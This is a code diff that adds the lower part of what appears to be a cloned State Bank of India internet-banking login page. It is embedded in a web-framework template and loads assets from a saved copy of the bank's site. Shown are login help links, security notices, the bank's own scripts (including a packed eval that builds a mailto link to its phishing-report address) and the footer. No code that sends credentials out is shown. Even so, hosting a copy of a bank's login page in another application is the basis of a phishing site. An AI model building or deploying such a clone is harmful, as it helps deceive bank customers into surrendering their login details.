+                                    <li><a tabindex="20" onclick="window.open(&#39;troubleloginhome.htm?bankCode=0&#39;,&#39;aboutus&#39;,&#39;width=780, height=500 ,status=1, scrollbars=1, location=0&#39;)" href="https://retail.onlinesbi.com/retail/login.htm#">
+
+                                        Trouble logging in
+                                    </a>
+                                    </li>
+
+                                    <li><a tabindex="21" href="https://retail.onlinesbi.com/personal/passwordmanagement.html" target="_blank">
+
+                                        Password Management
+                                    </a></li>
+
+                                    <li><a tabindex="22" href="https://retail.onlinesbi.com/personal/securitytips.html" target="_blank">
+
+                                        Security Tips
+                                    </a></li>
+
+                                    <li><a tabindex="23" href="https://retail.onlinesbi.com/personal/faq.html" target="_blank">
+
+                                        FAQ
+                                    </a></li>
+                                </ul>
+
+
+                                <ul class="login_box_links">
+                                    <li><a tabindex="24" href="https://retail.onlinesbi.com/personal/aboutphishing.html" target="_blank">
+
+                                        About Phishing
+                                    </a></li>
+
+                                    <li><a tabindex="25" href="javascript:openemail()">
+
+                                        Report Phishing
+                                    </a></li>
+
+
+                                    <li><a tabindex="26" onclick="window.open(&#39;lockaccountdetails.htm?bankCode=0&#39;,&#39;aboutus&#39;,&#39;width=780, height=500 ,status=1, scrollbars=1, location=0,resizable=yes&#39;)" href="https://retail.onlinesbi.com/retail/login.htm#">
+
+                                        Lock User Access
+                                    </a></li>
+
+
+                                    <li><a tabindex="27" onclick="window.open(&#39;blockatmcardintermediate.htm?bankCode=0&#39;,&#39;hotlistatmcard&#39;,&#39;width=780, height=500 ,status=1, scrollbars=1, location=0,resizable=yes&#39;);return true;" href="https://retail.onlinesbi.com/retail/login.htm#">
+
+                                        Block ATM Card
+                                    </a></li>
+
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+
+
+                    <div class="col-lg-4 col-md-4 col-sm-4">
+                        <div class="login_box">
+                            <span class="glyphicon glyphicon-ok-circle"></span>
+
+
+                            <p>
+                                This site is certified by Verisign as a secure and trusted site. All information sent or received in this site is encrypted using 256-bit encryption
+                            </p>
+
+
+                        </div>
+                    </div>
+
+                </div>
+
+                <div class="row" id="provide_list">
+                    <div class="col-lg-12 col-md-12 col-sm-12">
+                        <ul class="provide">
+
+
+                            <li>Mandatory fields are marked with an asterisk (*)
+                            </li>
+                            <li>Do not provide your username and password anywhere other than in this page
+                            </li>
+                            <li>Your username and password are highly confidential.Never part with them.<strong>SBI</strong> will never ask for this information.
+                            </li>
+
+
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+
+
+            <input type="hidden" name="di97" id="di97" value="rk8hv55f7pli8ae5ahadh8s43fq08asi">
+        </form>
+
+        <!-- </div> -->
+
+        <!-- <div id="loading">
+                            <table border=0 align=center cellPadding=6 cellSpacing=0>
+                                <tr>
+                                    <td height="190"><img src="/sbijava/images/app_loading.gif">
+                                    </td>
+                                </tr>
+                            </table>
+                        </div> -->
+
+        <!-- login content Ends here-->
+
+
+        <!-- Wrapper Ends -->
+
+        <script type="text/javascript">
+	constructKeyboard();
+</script>
+
+        <script type="text/javascript">
+
+ function init(){
+	document.getElementById("chkbox").checked = false;
+	//document.getElementById("loading").style.display="none";
+	document.getElementById("login_block").style.display="";
+	//document.getElementById("logonRemark").style.display="";
+	try{
+	document.getElementById("username").focus();
+	}catch(exception)
+	{
+		// do nothing
+	}
+	document.getElementById("browserName").value = navigator.userAgent;	 //Added by Venkatesh
+	constructKeyboard();
+	}
+
+function fnShowContent(errorCode,language){
+
+
+   if(errorCode != null && errorCode != ''){
+
+	//document.getElementById("phishing_block").style.display="none";
+	$('#phishing_block').css("display","none");
+	//document.getElementById("phishing_block_hindi").style.display="none";
+	$('#phishing_block_hindi').css("display","none");
+	//document.getElementById("login_block").style.display="";
+	$('#login_block').css("display","");
+	init();
+    }else {
+	if(language=='hindi'){
+
+		//document.getElementById("phishing_block").style.display="none";
+		$('#phishing_block').css("display","none");
+		//document.getElementById("phishing_block_hindi").style.display="block";
+		$('#phishing_block_hindi').css("display","block");
+	}
+	else{
+
+		//document.getElementById("phishing_block_hindi").style.display="none";
+		$('#phishing_block_hindi').css("display","none");
+		//document.getElementById("phishing_block").style.display="block";
+		$('#phishing_block').css("display","block");
+	}
+
+	//document.getElementById("login_block").style.display="none";
+	$('#login_block').css("display","none");
+}
+}
+
+function fnNewUserClick(){
+	var retVal = confirm("If you have already obtained Pre-Printed Kit  from the branch for activating INB facility , please don't proceed  with this link. You can input userid and password given in PPK on normal login screen.");
+	if( retVal == true ){
+		window.open('userdrivenregdetails.htm','aboutus','width=920, height=500 ,status=1, scrollbars=1, location=0,resizable=yes');
+	}
+}
+
+
+
+eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('3 2(){1.0="4:5.8@@7.6.9"}',10,10,'location|document|openemail|function|mailto|report|co|sbi|phishing|in'.split('|'),0,{}))
+</script>
+
+        <script>
+                     fnShowContent('','english');
+     </script>
+
+        <script>
+
+	 $(document).ready(function() {
+			setTimeout(function(){
+				$('#wpanel_vticker').vTicker({
+					speed: 700,
+					pause: 4000,
+					animation: 'fade',
+					mousePause: true,
+					showItems: 1,
+					height: 20
+				});
+			}, 100);
+
+			// function showinvalidmessage(){ alert("here");
+			if($(".err_mssg").length) {
+				$(".err_mssg").fadeTo( "slow", 0.8 );
+				setTimeout(function(){
+					$(".err_mssg").fadeOut("slow");
+					$(".care_msg").fadeIn();
+				},10000);
+			}
+
+
+			//}
+		});
+</script>
+
+
+
+        <!--footer starts here-->
+
+
+
+
+
+
+
+
+
+
+
+
+
+        <div class="row" id="footer">
+            <!-- <footer id="footerContent"> -->
+
+            <div id="footer_area">
+                <div class="col-lg-4 col-md-4 col-sm-4">
+                    <img src="@routes.Assets.versioned("State Bank of India - Personal Banking_files/veriSign_logo.png")" alt="VeriSign">
+                </div>
+                <div class="col-lg-8 col-md-8 col-sm-8">
+                    <ul id="footer_links" class="pull-right hidden-xs">
+
+
+                        <li><a href="https://retail.onlinesbi.com/sbijava/retail/html/Privacy_Statement.html" target="_blank">Privacy Statement</a>
+                        </li>
+                        <li><a href="https://retail.onlinesbi.com/sbijava/retail/html/hmpg_disclosure.html" target="_blank">Disclosure</a>
+                        </li>
+                        <li><a href="https://retail.onlinesbi.com/sbijava/retail/html/Terms_of_Use.html" target="_blank">Terms of Service (Terms &amp; Conditions)</a>
+                        </li>
+
+
+
+                    </ul>
+                    <div class="clearfix"></div>
+                </div>
+            </div>
+
+            <div class="col-sm-12 col-xs-12" id="best_view">
+
+
+                <div class="pull-left">
+                    <p>© State Bank of India</p>
+                </div>
+                <div class="pull-right hidden-xs">
+                    <p>Site best viewed at 1024 x 768 resolution in I.E 10 +,
+                        Mozilla 35 +, Google Chrome 35 +</p>
+                </div>
+
+
+            </div>
+            <div title="Move To Top" id="scrollup" style="display: block;"></div>
+        </div>
+
+        <!-- Modal box -->
+        <div id="myModal" class="modal fade net_branch" role="dialog">
+            <div class="modal-dialog" style="width:60%;">
+                <!-- Modal content-->
+                <div class="modal-content">
+                    <div class="row">
+                        <div class="col-md-3 hidden-xs">
+                            <img src="@routes.Assets.versioned("State Bank of India - Personal Banking_files/netbanking_img.png")" alt="Netbanking Branches">
+                        </div>
+                        <div class="col-md-9" style="padding-left:45px;">
+                            <div class="modal-header">
+                                <button type="button" class="close" data-dismiss="modal">×</button>
+                                <h4 class="pull-left">Netbanking Branches</h4>
+                            </div>
+                            <div class="modal-body">
+                                <p style="margin:0px;">All branches of State Bank of India are Internet Banking enabled. If you already have an account with us, ask your branch to give you Internet Banking. If you don't have an account, just step into any of our branches and open an account with Internet Banking facility. Internet Banking facility is available free of cost. Location of our branches can be known by visiting <a href="https://www.sbi.co.in/">www.sbi.co.in</a>.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- Modal box -->
+
+    </div>
+</div>
+
+
+</body></html>
